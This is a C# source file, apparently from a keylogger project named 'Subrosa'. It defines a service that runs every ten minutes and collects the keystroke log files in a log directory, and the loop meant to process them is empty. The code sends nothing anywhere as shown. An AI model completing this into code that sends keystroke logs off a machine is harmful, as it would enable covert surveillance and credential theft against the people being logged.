using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Timers;

namespace Subrosa
{
    public class NetworkAccessService
    {
        private BackgroundWorker _worker;
        private Timer _timer;

        public NetworkAccessService()
        {
            _worker = new BackgroundWorker();
            _worker.DoWork += CheckKeyLogs;
            _timer = new Timer(600000);
            _timer.Elapsed += TimerElapsed;
            _timer.Start();
        }

        private void TimerElapsed(object sender, ElapsedEventArgs e)
        {
            if (!_worker.IsBusy)
                _worker.RunWorkerAsync();
        }


        private void CheckKeyLogs(object sender, DoWorkEventArgs e)
        {
            string[] files = Directory.GetFiles(Logger.LogPath, "*.txt", SearchOption.AllDirectories);

            foreach (string file in files)
            {

            }


        }
    }
}
